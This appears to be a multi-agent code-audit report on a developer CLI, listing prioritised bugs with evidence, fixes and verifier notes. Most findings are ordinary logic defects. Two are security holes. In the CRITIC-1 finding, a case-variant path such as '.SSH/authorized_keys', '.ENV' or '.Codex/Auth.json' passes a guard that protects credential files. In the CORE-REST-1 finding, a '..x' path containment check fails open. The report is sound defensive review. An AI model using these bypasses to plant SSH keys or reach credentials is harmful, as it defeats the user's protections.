- **W2-SEC-GIT**: I read three files in full, line by line: packages/security/src/git/pack-reader.ts (1-1055), supervisor.ts (1-379) and local-receive.ts (1-351). I also read code outside the range where I needed it to judge correctness: the process-table EDGES and table validation (process-table.ts:270-277, 395-430, 693-950), core validateGitPackReaderBudget (packages/core/src/git/types.ts:322-339), the runtime wiring of prepareLocalReceive (apps/cli/src/commands/git/runtime.ts:840-915), gateway permit issuance (gateways.ts:340-400), and spec §4.2's edge table and terminationGraceMs.

I ran two probes against the built dist from the scratchpad:
- Hand-built packs whose blob zlib stream is 16383, 16384, 16385 and 40011 compressed bytes, so a stream ends exactly on the reader's 16-KiB input chunk boundary. All four were admitted, so the stream-end and bytesWritten handling is correct.
- A real git-repacked pack of 180 objects with OFS deltas. It was admitted at delta depth 1.

What checked out:
- Pack parsing bounds: header varints, OFS distance, REF base, truncation, trailer and index fanout/CRC/offset checks.
- Spill-file guards and ledger accounting.
- Supervisor permit binding (argv/env/cwd/stdin hashes, phase identity, executable recheck). TERMINATION_GRACE_MS=100 matches the spec.
- Local-receive shadow verification and final-path classification.

The main finding is that the supervisor does not enforce the spec's `when`/minUses edge semantics. The other three are low.

Dropped (5):
- No tree-entry name validation (`.`, `..`, `.git`): outside the reader's stated contract, and the trees are built by the product.
- A refused permit stays `consumed` and could still serve as a parent in issue(): no gateway flow reaches it.
- Quadratic re-materialization of delta chains (already marked ponytail): only matters for chains deeper than ~50, and git did not produce deep chains in the probe.
- No deadline tick in #chainRoot/resolveDeltas: bounded to about 52 rounds.
- Mixed budget.deltaDepthMax vs limits.deltaDepthMax: affects tests only.

No BACKLOG row covers these files. _(dropped by cap: 5)_
- **W2-GAP-STATE**: Read in full: apps/cli/src/commands/status.ts:1-110; doctor.ts readers that status calls (listTransactionIds/listIncompleteTransactions/surveyTransactions/readSurveyedJournal 257-349, inspectManagedDrift/inspectV2Drift 1287-1307, the guarded() wiring 1777-1800, checkTransactions 1034-1060); bootstrap/report.ts assertOrdinaryCommandAdmitted 1673-1726; brain service.ts 140-341 (parseIndexDocument, search, sessionContext, status); reindex.ts writeIndexArtifacts 380-470; brain.ts runReindex 137-185; automation runner.ts job dispatch 555-590; hooks/inject.ts; project-slug.ts; discovery discover.ts 50-135, 195-370; garden select.ts 1-80 and garden.ts 55-100; lint.ts 675-700; ingest proposal.ts 220-240, apply.ts 50-70, validate.ts 600-700; core update participants.ts 420-445, owner.ts 70-80, planner.ts 612-630, bundle-participant.ts 490-505, paths.ts 55-115, plans/validate.ts 290-318. I also grepped every toLowerCase/normalize("NFC")/foldPath site in apps and packages; the git and workflow-schema sites were skipped as unrelated to paths. Non-findings: every index.json writer (brain reindex, ingest, refactor, and the scheduled brain-reindex via runScheduledBrain) goes through writeIndexArtifacts -> TransactionExecutor, which writes a temporary file beside the target and renames it into place (core transactions/executor.ts:1496-1503). Concurrent readers (search, the inject hook, the ingest excerpt) therefore never see a torn index.json. The only leftover is that index.json and vault-map.md are renamed one after the other, which is not material. Garden's scheduled reindex() only builds in memory. Core update folding is consistent: participants.ts:432 lowercases without NFC, but targetPath is already NFC-checked by parseCanonicalAbsolutePathText. A case-variant pair in an ingest proposal escapes the NFC-only dedupe, but core validateChangePlan's foldPath refuses it later (fail-closed), so I did not report it. Discovery's exact-case private-folder exclusion is the refuted BRAIN-7 area and is not reported again. Four material findings.
- **W2-GAP-HOST**: I read every line of packages/platform-macos/src/launchd/plist.ts (1-297), schedule.ts (1-148), registry.ts (1-248) and apps/cli/src/commands/import.ts (1-699). I also read the out-of-range code needed to judge them: update/entrypoint.ts:1-100, local-release.ts:50-62, automation/service.ts:300-340 and 1035-1060, the admitPinned part of garden.ts, pulse.ts:85-115, ingest.ts invokeAgentOnce, and untrusted-file.ts:1-120. I did not read bootstrap.ts, effects.ts, plan.ts, observe.ts, process-table.ts, effect-journal.ts or runner.ts line by line; I only grepped them.

The main result has host evidence and is critical. Every generated plist names `<home>/bin/developer-os.mjs` as ProgramArguments[0]. That file is mode 0600 and has no shebang, so launchd cannot exec it. On the founder Mac, read-only `launchctl print` shows each loaded developer-os job with `runs = 1`, `last exit code = 78: EX_CONFIG` and `penalty box`. All status and log files are 0 bytes. NEW-138 proved only that the labels load, not that a job runs.

The failure is also invisible. `automation status` reports `never`, both sinks are /dev/null, and nothing reads launchd's exit status.

On the environment: the plist carries no EnvironmentVariables, so a job gets launchd's default PATH=/usr/bin:/bin:/usr/sbin:/sbin and no LANG or CODEX_HOME. This matters only after the exec fix. The garden pins an absolute claude path and pulse uses /usr/bin/osascript with env {}, so I report no separate PATH defect. Note that the D82 post-check limits the plist environment to launchd's own keys, so a fix that adds an environment must update that check.

Import has two issues. Over-cap probing reads and redacts every file past the cap, can leak over-broad warnings from files it never imports, and lets any non-refusal read error fail the whole run. Separately, an unreadable file (EACCES) inside the cap aborts the run instead of producing a per-file refusal.

- **CRITIC**: Completeness pass over the 18 area reports. I probed four integrations nobody had traced: case-insensitive APFS paths through ProtectedPathPolicy, vendor-home overrides against the protected-path rules, config loading into each consumer's redaction binding, and the clock and timeout budgets of hooks against the vendor timeouts. Two of these produced verified security findings, both in ProtectedPathPolicy, the one barrier used by `guard path`, `guard format`, `import` and every guarded readText. The first: protected names are matched case-sensitively, so a case-variant write that creates a new `.SSH/authorized_keys`, `.ENV` or `.Codex/Auth.json` passes. I reproduced this against the built policy. The second: `read-codex-auth` is pinned to `~/.codex/auth.json` even though the product follows `CODEX_HOME`. Config-to-redaction binding (git sync builds its own redactor from config) and the hook timeout semantics are consistent or already documented. Gaps I left unexamined: (a) `status` reads only the V1 transaction store and the manifest, so like doctor (FLOW-UNINST-1) it cannot see V2 coordinator journals, the ledger or the uninstall marker; (b) `import` runs over-cap files through full read and redaction just to count them; (c) a hook reading index.json while `brain reindex`/a scheduled job rewrites it (atomic rename assumed, not verified); (d) the unread bodies of compose.ts, apply-ports.ts, planning.ts, construction.ts, rollback.ts, migrations.ts, lifecycle/executor.ts, report.ts, journal-store.ts, git/supervisor.ts, local-receive.ts, pack-reader.ts and the update scratch, planner and verifier process files; (e) NFC folding is inconsistent across case-fold sites (participants.ts:432 folds case only, with no NFC; the others fold both); (f) the launchd job environment (PATH and HOME) for scheduled runs compared with interactive runs.

## P0

### W2-GAP-HOST-1 · logic · launchd ProgramArguments[0] is a 0600, shebang-less .mjs file, so every scheduled job fails to exec (EX_CONFIG 78)

`packages/platform-macos/src/launchd/registry.ts:159` · related: NEW-134, NEW-138

**Problem.** scheduledBaseArgv puts the verified entrypoint itself in argv slot 0, and launchd execs that path directly. That file is `<product-home>/bin/developer-os.mjs`. It is written 0600 on purpose ("node never needs the execute bit", local-release.ts:50-56), and renderEntrypoint (update/entrypoint.ts:30-41) emits no `#!` line. posix_spawn therefore fails twice over: no execute bit, and no interpreter. No scheduled job (doctor, brain-reindex, brain-lint, brain-pulse, brain-garden, git-sync) can ever run. Hooks already avoid this by naming Node explicitly (`<node> <entrypoint>` via stableNodePath, hooks.md §4). Even if the entrypoint had an `env node` shebang, launchd's default PATH (/usr/bin:/bin:/usr/sbin:/sbin) has no Homebrew or nvm node.

**Evidence.**

```
registry.ts:158-166: `return [ boundedPath(executable, "executable path"), "automation", "run", launchdJob(id).id, "--scheduled", ...]`. service.ts:322: `const path = canonical(entrypointPath(productHome));` (verifiedAutomationExecutable). Live host evidence, read-only: `stat` gives `-rw------- ~/.developer-os/bin/developer-os.mjs`, and its first line is `// Developer OS entrypoint...` (no shebang). `plutil -p ~/Library/LaunchAgents/com.developer-os.doctor.plist` shows `0 => "/Users/msolecki/.developer-os/bin/developer-os.mjs"`. `launchctl print gui/$(id -u)/com.developer-os.doctor.g.644d…` shows `runs = 1`, `last exit code = 78: EX_CONFIG`, `properties = penalty box | inferred program`, and default environment `PATH => /usr/bin:/bin:/usr/sbin:/sbin`. brain-lint, brain-reindex and brain-pulse show the same. Every `~/.developer-os/state/automation-*.status.json` and `logs/automation-*.0.json` is 0 bytes. NEW-138 (closed) proved only 'three labels loaded', and NEW-134 still owes 'one real scheduled run'.
```

**Fix.** Make the launchd argv `[<stable node path>, <entrypoint>, "automation", "run", ...]`, reusing `stableNodePath` (apps/cli/src/instructions/apply.ts:309) and the same `assertHookNodePath` grammar that hooks use. Bind the node path into LaunchdGenerationProjectionV1 and the generation hash. Update encodeLaunchdPlist's fixed length (9 becomes 10) and parse, the D82 post-check's expected `program`/arguments, and uninstall.ts:1256 (`executablePath: canonical(String(argv[0]))`), which reads argv[0] back. Do not chmod the entrypoint or add a shebang: that would still depend on launchd's PATH.

**Validation.** Unit: scheduledProgramArguments starts with an absolute node path, followed by the entrypoint. Host: on a disposable home, `automation enable --apply`, then `launchctl kickstart gui/<uid>/<label>`, then `launchctl print` shows `last exit code = 0`, and `automation-doctor.status.json` is non-empty with outcome success. Add this kickstart step to the NEW-138 disposable launchd gate, which today stops at 'loaded'.

**Verifier (confirmed).** Verified in code and on the host. registry.ts:158-166 puts the executable in argv[0]. service.ts:322 resolves it to entrypointPath(productHome), and plist.ts:150-153 writes ProgramArguments with no Program or interpreter. renderEntrypoint (entrypoint.ts:30-41) emits no shebang. Read-only host check: ~/.developer-os/bin/developer-os.mjs is -rw------- and starts with '// Developer OS entrypoint'. plutil shows ProgramArguments 0 => that .mjs. `launchctl list` shows exit 78 for doctor, brain-lint, brain-reindex and brain-pulse. hooks.md:311 already names Node explicitly for exactly this reason. Not in known.json. NEW-138 proved only the load step, and NEW-134 still owes a real scheduled run. No scheduled job can execute.

Orchestrator host check (2026-10-05): `launchctl print` shows brain-garden, brain-lint, brain-pulse and doctor with `runs = 1`, `last exit code = 78: EX_CONFIG` and `penalty box`. `~/.developer-os/bin/developer-os.mjs` is `-rw-------` and has no shebang.

## P1

### FLOW-UPD-1 · logic · `update` reads and closes FD 3 even when no trust pipe was passed, which aborts Node (exit 134)

`apps/cli/src/update/planning.ts:597` · related: NEW-112, NEW-111

**Problem.** bin.ts removes the launcher's `--offline-release-trust-fd=3` marker but throws away whether it was there. planUpdateAttempt then calls `update.readOfflineTrust()` unconditionally. When no pipe was passed, FD 3 is a descriptor Node itself owns. That happens on every `node <home>/bin/developer-os.mjs update` (the D53 production path). It also happens under the launcher today: LAUNCHER_OFFLINE_RELEASE_ROOTS = [] makes trust null, so the launcher passes neither the pipe nor the flag. In a plain Node 24 process on macOS, FD 3 passes the reader's FIFO check. The read then fails with ENXIO, and the `finally` block in readOfflineReleaseTrustFd calls close(3), which closes libuv's kqueue descriptor. The next poll of the event loop hits an assertion and the process aborts with SIGABRT (exit 134). So every `update`, `update --apply` and `update --version` aborts instead of returning a classified refusal. New evidence beyond NEW-112: that row says such updates 'refuse'. They actually crash before any refusal runs. The unsigned-local refusal (ReleaseUnsignedLocalError) only comes after FD 3 and the network fetch, so it never gets a chance to run.

_Orchestrator check: tests/e2e/release-update.test.ts drives `update` in-process via run(), never as a spawned `node bin … update`, so the production path is untested._

**Evidence.**

```
apps/cli/src/bin.ts:121 `const argv = launchedArgv[0] === LAUNCHER_TRUST_ARGUMENT ? launchedArgv.slice(1) : launchedArgv;` (presence discarded)
apps/cli/src/update/planning.ts:597 `const offline: OfflineReleaseTrustV1 = await update.readOfflineTrust();` (unconditional)
packages/security/src/update/handoff.ts:107-108 `} finally {\n    await close();` (closes a descriptor that was never handed over)
apps/launcher/src/selection.ts:607-611: without trust the flag and FD 3 are both omitted.
Probe: `node scratchpad/probe.mjs` (imports apps/cli/dist/update/context.js, calls readOfflineTrust()) printed `rejected: Error ENXIO ENXIO: no such device or address, read` then `Assertion failed: (errno == EINTR), function uv__io_poll, file kqueue.c, line 279.` exit=134. Tests inject readOfflineTrust (apps/cli/src/update/testing.ts:651,893; tests/security/network.test.ts:495), so this path is never exercised.
```

**Fix.** Fix the root cause in bin.ts, which already knows whether the marker was present. Pass `launcherTrustHandoff: boolean` into the CLI context and have `createCliUpdateContext().readOfflineTrust` refuse (for example `update_launcher_handoff_absent`, exit 4) before any fstat, read or close of FD 3 when the marker was absent. Also check `home.trust` for unsigned-local right after readHome, so that home refuses before it touches FD 3 or the network.

**Validation.** Re-run the probe: `node -e 'import("/Users/msolecki/www/developer-os/apps/cli/dist/update/context.js").then(m=>m.readOfflineTrust()).catch(e=>console.log(e.code));setTimeout(()=>console.log("alive"),100)'` must print the refusal and `alive` with exit 0. Add a unit test: an update context built with the marker absent refuses without ever calling the fstat/read/close deps.

**Verifier (downgraded).** Confirmed. bin.ts:121 drops the marker, and planning.ts:597 calls update.readOfflineTrust() unconditionally. context.ts:523-546 reads FD 3, and handoff.ts:107-108 closes it in `finally`. I reproduced the crash: in a plain `node -e` process, FD 3 is a FIFO (fstat isFIFO=true). Importing apps/cli/dist/update/context.js and calling readOfflineTrust() prints `rej ENXIO`, then `Assertion failed: (errno == EINTR), function uv__io_poll, file kqueue.c` and exit=134. So `update` aborts instead of refusing, and the reader's own FIFO, open-descriptor and ppid checks do not catch it. I downgraded it from critical: update cannot succeed in production today anyway (LAUNCHER_OFFLINE_RELEASE_ROOTS = [], NEW-111/112). For --apply the abort comes after recoverUpdate has released the global lock and before any write, so no state is damaged. The result is a crash in place of a refusal, not data loss.

### W2-BOOT-A-1 · logic · A plan that admits a pre-existing global lock can never retain a rollback that happens before its first created path

`apps/cli/src/bootstrap/executor.ts:3802` · related: NEW-100

**Problem.** When state/.lifecycle.lock already exists (after a rolled-back init, and after every uninstall, because the bookkeeping set survives), buildPlan omits the global_lock row. planFreshInit then takes the admitted lock up front (lines 1580-1582), and executeFreshInit takes it again on resume (line 1656: `plan.createdPaths[0]?.kind !== "global_lock"`). retainTerminal, however, decides whether a global lock should be held only from `terminal.nextCreatedPath > 0`. If the run fails during payload staging (nextCreatedPath === 0), compensation reaches rolled_back, but retainTerminal sees held.global !== null while globalReached === false and refuses. Every later `init` resumes the same plan, takes the admitted lock again, and refuses again: the envelope is wedged. The refusal also replaces the original failure message (see W2-BOOT-A-4).

**Evidence.**

```
executor.ts:3801-3808: `const globalReached = terminal.nextCreatedPath > 0; if (held?.bootstrap === null || ... || globalReached !== (held.global !== null)) { throw new FreshBootstrapError(EXIT_CODES.recoveryRequired, "terminal retention lock reachability is unbound"); }`. Compare line 1656 `if (journal.nextCreatedPath > 0 || plan.createdPaths[0]?.kind !== "global_lock") { await this.ensureGlobalLock(plan); }` and line 2091 `...(admitsLock ? [] : [{ kind: "global_lock" ...`. Probe output (temp fixture home, dist build of 2026-10-03): `run1 false probe fail at after_global_lock` / `run2 false terminal retention lock reachability is unbound` (injected failure at after_first_payload) / `run3 false terminal retention lock reachability is unbound` (no failure injected, plain retry).
```

**Fix.** Use the same predicate in both places: `const globalReached = terminal.nextCreatedPath > 0 || plan.createdPaths[0]?.kind !== "global_lock";`. Then check that retainBootstrapEnvelope / deriveBootstrapRetentionTable handle a held admitted lock that has no created-path row (the lock is admitted, never retained).

**Validation.** Add a bootstrap test modeled on bookkeeping.v2.test.ts:101. A first init fails at after_global_lock; a second init uses bootstrapFailureHook to fail at after_first_payload and must report that failure; a third plain init must then succeed or reach a retained rolled_back envelope instead of refusing. Re-run the scratchpad probe and expect run3 ok. Related: NEW-100, whose uninstall-to-init round trip would cover the after-uninstall form of this failure.

**Verifier (confirmed).** The code matches the report. executor.ts:3801 sets `const globalReached = terminal.nextCreatedPath > 0`. executeFreshInit:1656 also takes the global lock when `plan.createdPaths[0]?.kind !== "global_lock"`, which is the admitted-lock plan, and planFreshInit:1580-1582 acquires the admitted lock up front. So a failure during payload staging (nextCreatedPath 0) leaves held.global non-null while globalReached is false, and the check throws. I re-ran the probe in the scratchpad, probe-admitted-lock.mjs, against a mkdtemp fixture home. The dist was built at the NEW-133 commit, the last change to executor.ts, and retainTerminal is unchanged since. Output: run1 'probe fail at after_global_lock', run2 'terminal retention lock reachability is unbound', run3 (no injected failure) 'terminal retention lock reachability is unbound'. The envelope is wedged. No BACKLOG row or test covers it.

### W2-BOOT-B-1 · logic · compensate() cannot resume a payload cursor whose payloadRetentionPart is already recorded

`apps/cli/src/bootstrap/executor.ts:3689`

**Problem.** For every payload cursor, the compensation loop unconditionally writes payloadRetentionPart "staged_file", then "evidence", then advances compensationNext. It never reads the journal's current payloadRetentionPart. The core transition grammar (bootstrap-retention.ts:696-707) accepts "staged_file" only when the current part is null, and "evidence" only when it is "staged_file". Suppose a process dies or throws after line 3689 or 3743 but before the compensationNext advance at 3747. Examples: a crash, a refusal from projectBootstrapRetentionPostimage, or a failed readPayloadEvidence. On resume, executeFreshInit calls retainTerminal, which throws 'no terminal state'; the catch then calls compensate again, and that call re-issues payloadRetentionPart "staged_file" on a journal already at "staged_file" or "evidence". The grammar refuses it, store.advance throws, and every later recovery repeats the same refusal. The bootstrap is stuck in phase compensating for good.

**Evidence.**

```
journal = await this.writeJournal(plan, journal, {
          payloadRetentionPart: "staged_file",
        });
...
        journal = await this.writeJournal(plan, journal, {
          payloadRetentionPart: "evidence",
        });
      }
      journal = await this.writeJournal(plan, journal, {
        compensationNext: cursor - 1,
        payloadRetentionPart: null,
      });
The grammar in packages/core/src/manifest/bootstrap-retention.ts:700: `if (current.payloadRetentionPart === "staged_file") { return changed.length === 1 && changed[0] === "payloadRetentionPart" && next.payloadRetentionPart === "evidence" ...`
```

**Fix.** Make each sub-step conditional on the recorded part. Write "staged_file" only when journal.payloadRetentionPart === null, and write "evidence" only when it is not already "evidence". Then advance compensationNext with payloadRetentionPart null.

**Validation.** Add an executor.test.ts case that fails at during_payload_write (already used), interrupts on a death point placed between the staged_file and evidence journal writes in compensate (or at during_inactive_slot_write during compensation), then reruns init. Expect phase retained / terminalOutcome rolled_back instead of a refused journal successor.

**Verifier (confirmed).** Confirmed. executor.ts:3689 always writes payloadRetentionPart "staged_file", and 3743 always writes "evidence". writeJournal (2650) merges the patch onto store.current(). If the journal already holds staged_file, the patch changes nothing, so changedStateKeys is empty and isLegalSamePhaseTransition (bootstrap-retention.ts:651) returns false. If it holds "evidence", writing staged_file goes against the grammar at 696-707. store.advance runs validateSlots, then selectBootstrapJournal, then validateBootstrapJournalSuccessorPair, so the advance is refused. The resume path is real. A compensating journal makes stagePayloads, createOrdinary and applyFoundation return early, terminalJournal returns null, and retainTerminal throws a FreshBootstrapError (not an interruption), so the catch at 1680 calls compensate again. Two ways to get there: (a) any throw after 3689, such as the identity refusals at 3731/3740 or a readPayloadEvidence error; (b) a death at during_inactive_slot_write while the evidence or compensationNext advance is being written. The fine-grained death sweep (executor.test.ts:443) only adds a failure for after_rolled_back, so no test covers a death in the middle of compensation. Not in known.json or BACKLOG.

## P2

### CLI-CMD-1 · logic · A failing `doctor` publishes only the failing messages and discards the report its docstring promises

`apps/cli/src/commands/doctor.ts:2018`

**Problem.** The docstring says a failing run is still a complete report with the checks returned as data, but on any non-zero code `runDoctor` returns a hand-built `failure()` carrying only a `; `-joined message of the failing checks, their paths and one recovery. The `warn` and `pass` checks, `instructions` and `retainedBootstrapEvidence` never reach `--json`, and the human path (main.ts `emit` failure arm) prints one joined line instead of the per-check `[status] id: message` lines. `project check` shows the intended shape: it passes `report` as `data` to `failureFrom`. The only e2e test asserting a failing doctor checks `kind` and `recovery`, never `checks`.

**Evidence.**

```
doctor.ts:2005-2007 `Doctor reports and never repairs, so a failing run is still a complete report: the checks are returned as data and the exit code carries the severity.` vs doctor.ts:2018 `return failure(code, { kind: "doctor_failed", message: failed.map((check) => `${check.id}: ${check.message}`).join("; "), paths: failed.flatMap((check) => check.paths), ...(recovery === undefined ? {} : { recovery }) });` (no `data`). Contrast project-check.ts:219-225 `failureFrom(context, new ProjectCheckFailure(...), failed.flatMap(...), undefined, report)`. tests/e2e/foundation.test.ts:518 asserts only `failure.kind` and `failure.recovery`.
```

**Fix.** Build the failure through `failureFrom(context, new DoctorFailure(code, message), paths, recovery, report)` so the full report travels as redacted `error.data`. Make `emit` (or a doctor-specific render) print the per-check lines from `error.data.checks` in human mode when present. Keep the exit code and `kind: doctor_failed`.

**Validation.** Add an e2e/unit case: a home with one failing check and one warning, run `doctor --json` and assert `error.data.checks` contains both, and run human mode and assert a `[warn]` line is printed. `tests/repository/failure-data-entry.test.ts` must stay green.

**Verifier (confirmed).** doctor.ts:1988-1990 docstring says a failing run 'is still a complete report: the checks are returned as data', but doctor.ts:2016-2021 returns failure() with only kind/message/paths/recovery and no data. main.ts:865-872 passes the result to emit(), which renders per-check lines only on result.ok. project-check.ts:219-225 passes the report as data to failureFrom. So on a failing doctor, warn/pass checks, instructions and retainedBootstrapEvidence are lost in both --json and human output. The only e2e test (foundation.test.ts:518) does not assert checks.

### CORE-LIFE-1 · logic · A Foundation participant that fails mid-apply leaves the coordinator stuck: nothing rolls it back, and compaction would refuse the one case the engine treats as legal

`packages/core/src/lifecycle/coordinator.ts:643`

**Problem.** Compensation of the current step requires the participant's final journal to be `finalized`, absent, or `rolled_back`. `FoundationParticipantExecutor` has no rollback method, and `TransactionExecutor.resume` never rolls back on failure. A failed apply therefore leaves a non-terminal journal (`backed_up`, `staged`, `validated`, `applied`). `enterCompensation` then refuses with `lifecycle_foundation_participant_not_terminal` from inside the catch block, and every later `execute` or `recover` hits the same refusal. The only branch that accepts `rolled_back` (`return "hold"`) cannot be reached in production. If it were reached, `participantPositions` in coordinator-compaction.ts classifies the cursor-step participant as `unstarted` (`index < nextStep` is false). `removeFoundationEntry` then refuses because `journalEntry !== null` at line 145. The ledger's `admitParticipantCursor` calls that same position `current` and admits it. The three components disagree on the same state.

**Evidence.**

```
coordinator.ts:643-648: `if (phase !== "rolled_back") { refuseLifecycleRecovery("lifecycle_foundation_participant_not_terminal", ref.initialJournal.finalPath); } return "hold";`. coordinator-compaction.ts:145: `if (journalEntry !== null) { refuseLifecycleRecovery("lifecycle_coordinator_participant_state", journalPath); }` for any non-`executed` position. Greps run: `grep -n "rollbackLocked(\|this.rollback(" packages/core/src/transactions/executor.ts` finds no caller inside the resume path. `grep -rn "participant_not_terminal" packages/core/src/lifecycle/*.test.ts apps/cli/src` finds no test. coordinator.test.ts:785 models a started-then-failed participant as `rolled_back`, which the real executor never produces.
```

**Fix.** Choose one contract. Either add a `rollback(ref)` to `FoundationParticipantExecutor` (delegating to `executor.rollback`) and call it in `resolveCurrentStep` for a non-terminal journal before returning `hold`. Or document that a failed Foundation step is recovery-required and make the error name the exact repair command. In both cases make `removeFoundationEntry` compact a terminal `rolled_back` journal at the cursor through `deriveFoundationTerminalCompaction`, as it already does for `executed`.

**Validation.** Add a coordinator test with the real `FoundationParticipantExecutor` (not the fake) where the participant's apply throws at `validated`. Assert the coordinator ends `rolled_back` and that `recover()` then compacts it to an empty ledger. Add a compaction test whose cursor-step participant has a `rolled_back` final journal.

**Verifier (confirmed).** The code matches the quote. coordinator.ts:472-482: applyStep calls adapters.foundation.apply(ref). That reaches executor.ts:1765 executeLifecycleFoundationParticipant, which ends in this.resume(ref.id). resumeLocked (executor.ts:2140-2200) has no rollback on throw. The catch at coordinator.ts:444-447 calls enterCompensation, which calls resolveCurrentStep. For any phase other than finalized, null or rolled_back, that function refuses with lifecycle_foundation_participant_not_terminal (643-648). This contradicts the spec at docs/superpowers/specs/2026-08-21-developer-os-opt-in-surfaces-design.md:1722-1723: 'A non-finalized Foundation/effect journal must itself roll back'. The user also has no repair route: apps/cli/src/lifecycle/mutation-gate.ts:439-455 requireResolvedClosure lets `repair --rollback <id>` through only when snapshot.coordinators.length === 0, so the gate refuses while the coordinator ledger exists. The compaction mismatch is also real. participantPositions (coordinator-compaction.ts:276-279) marks the cursor participant 'unstarted', and removeFoundationEntry:145 refuses when a journal exists. No test or BACKLOG row covers this. One part of the evidence is wrong: coordinator.test.ts:785 models effect labels, not Foundation participants. That does not change the conclusion. Medium stands: a mid-apply failure strands the coordinator, but it fails closed and loses no data.

### CORE-REST-1 · security · containsPathLoosely/containsPath misread a child named '..x' as outside the root, so exclusion fails open

`packages/core/src/manifest/store.ts:128`

**Problem.** Containment is decided with `!fromRoot.startsWith("..")`. A legitimate child whose name merely begins with two dots (`<root>/..secret`) yields relative `..secret`, which is classified as outside the root. `plans/validate.ts` denies excluded roots through `containsPathLoosely` (`assertOwnedLocation`: `if (isWithinAnyLoosely(excludedRoots, path)) refuse("excluded_root")`), so a target `<excluded>/..x` inside an owned root is not refused. The same predicate drives `assertUsableRoots` and `resolveBackupPath` in drift.ts, where a valid backup named `..x` is rejected. `packages/security/src/paths.ts:40-44` uses the correct form (`!== ".." && !startsWith(".." + sep)`), so this is also an inconsistency.

**Evidence.**

```
store.ts:118-131: `return fromRoot === "" || (!fromRoot.startsWith("..") && !isAbsolute(fromRoot));` Checked with node: relative('/h/backups','/h/backups/..x') = '..x' and the predicate returns false, while '/h/backups/a' returns true. project-init.ts:269 passes `excludedRoots: [paths.home, paths.brain]`; init.ts:818 passes `[plan.paths.backupsDir]`. Same pattern at apps/cli/src/hooks/guards/child.ts:12 and stop.ts:37.
```

**Fix.** Replace the check with `fromRoot !== ".." && !fromRoot.startsWith(`..${sep}`) && !isAbsolute(fromRoot)` in both functions. Better, export one containment helper and reuse it in the CLI guards and `security/paths.ts`.

**Validation.** Add a unit test: containsPathLoosely('/h/backups','/h/backups/..x') is true, containsPath('/h','/h/..x') is true, and '/h/..' and '/h/../x' stay false. Add a plans.test case where a target `<excludedRoot>/..x` is refused with excluded_root.

**Verifier (downgraded).** The predicate is quoted correctly (store.ts:120 and 130: `!fromRoot.startsWith("..")`). It does classify `<root>/..x` as outside the root, and security/paths.ts uses the correct `..`+sep form. On the deny side (validate.ts:176 assertOwnedLocation, and :207 where an excluded root may contain an owned root) this fails open. However, change-plan targets are generated by the product from fixed relative paths, so no target is named `..x`. The realistic way in is a user-configured brain directory such as `<backupsDir>/..brain`, which would slip past the excluded-root check at :207. That is a self-inflicted misconfiguration, not an attacker-controlled path, so the bug is real but high overstates it.

### CORE-UPD-1 · duplication · Domain-separated no-LF SHA-256 reimplemented in six more files despite an exported helper

`packages/core/src/update/bundle-participant.ts:389`

**Problem.** bundle-participant.ts already exports `noLfHash(domain, value)`, and rollback.ts imports it. coordinator.ts, construction.ts, preview.ts (`hashNoLineFeed`), migrations.ts, participants.ts (`domainHash`) and release.ts each hand-roll the same 'domain, NUL, canonical bytes minus LF' digest. The copies disagree on contract: participants.ts `domainHash` does not append the NUL, so every caller must embed `\0` in the domain literal. A forgotten NUL silently produces a different digest. No copy applies the printable-ASCII domain check that `hashCanonicalJson` enforces. These digests bind plans, previews and journals, so one drifting copy breaks cross-process verification.

**Evidence.**

```
bundle-participant.ts:389 `export function noLfHash(domain, value) { return createHash("sha256").update(`${domain}\0`, "ascii").update(canonical(value).slice(0, -1), "utf8")...`. Copies: coordinator.ts:298, construction.ts:470, preview.ts:274-277, migrations.ts:442, participants.ts:219 (`.update(domain, "ascii")`, callers pass `"developer-os/owner-current-partition/v1\0"`), release.ts:399. Ran: git grep -n 'slice(0, -1)' over packages and apps.
```

**Fix.** Add `hashCanonicalJsonNoLf(domain, value)` next to `hashCanonicalJson` in lifecycle/canonical-json.ts. It should append the NUL itself and validate the domain. Replace all the copies, and drop the embedded `\0` from the participants.ts literals.

**Validation.** The existing hash-pinning tests (coordinator.test.ts, preview.test.ts, participants.test.ts, release.test.ts) must pass byte-identical. Add one test that the helper equals `sha256(domain + NUL + encodeCanonicalJson(v).slice(0,-1))`.

**Verifier (confirmed).** Verified: bundle-participant.ts:389-391 exports noLfHash, and identical domain+NUL+canonical-minus-LF digests are hand-rolled at construction.ts:470, coordinator.ts:298, migrations.ts:442, participants.ts:219, preview.ts:277 and release.ts:399. participants.ts domainHash takes a domain without the NUL, so its callers (lines 261, 270, 624, 655, 714) embed \0 in the literal, which confirms the contract divergence. No BACKLOG row covers this.

### CRITIC-1 · security · ProtectedPathPolicy matches protected names case-sensitively, so on APFS a case-variant write creates .ssh/authorized_keys, .env or .codex/auth.json

`packages/security/src/protected-paths.ts:59`

**Problem.** matchesSegmentRule compares path segments with exact `includes`/`startsWith`, and home-exact compares resolved paths byte-for-byte. canonicalizePlannedPath only realpaths the existing ancestor and appends missing segments verbatim. Case is therefore corrected only for entries that already exist. If `~/.ssh` does not exist, `guard path` (and `guard format`) allow a write to `~/.SSH/authorized_keys`, and sshd later reads that file as `~/.ssh/authorized_keys` on the default case-insensitive volume. The same holds for creating `.ENV` (read as `.env`), `.AWS/credentials`, and `.Codex/Auth.json`/`.Claude/.credentials.json` where the real file is absent. hooks.md calls this 'a separate task', but no BACKLOG row tracks it.

**Evidence.**

```
protected-paths.ts:62-69: `case "segment": return segments.includes(match.name); case "segment-prefix": return segments.some((segment) => segment.startsWith(match.prefix) && ...` ; home-exact: `resolve(policyHome, rule.match.relativePath) === absolutePath`. paths.ts:58-61: `const canonicalAncestor = await realpath(existingAncestor); return join(canonicalAncestor, ...unresolvedSegments);`. Reproduced against packages/security/dist on an empty fake home: `DENY .ssh/authorized_keys / ALLOW .SSH/authorized_keys / DENY .env / ALLOW .ENV / DENY .codex/auth.json / ALLOW .Codex/Auth.json`. docs/architecture/hooks.md:624-626: 'On APFS, `Add File: .ENV` with no `.env` present creates a file that later reads as `.env` ... The gap is in `ProtectedPathPolicy` ... and is a separate task.' `grep -n -i 'case-fold\|\.ENV' docs/superpowers/BACKLOG.md` returns nothing.
```

**Fix.** In #assertAllowed, fold each segment and the home-exact comparison with `normalize("NFC").toLowerCase()`, the fold already used in core/manifest/store.ts and config/loader.ts. Compare against folded rule names and folded `except` entries, so the rule applies regardless of whether the entry exists yet. Add a BACKLOG row if the fix is deferred.

**Validation.** Unit test in protected-paths.test.ts: on an empty temp home, assertWritable must reject `.SSH/authorized_keys`, `.ENV`, `.Env.local`, `.Codex/Auth.json`, while still accepting `.env.example` and `.Env.Example`.

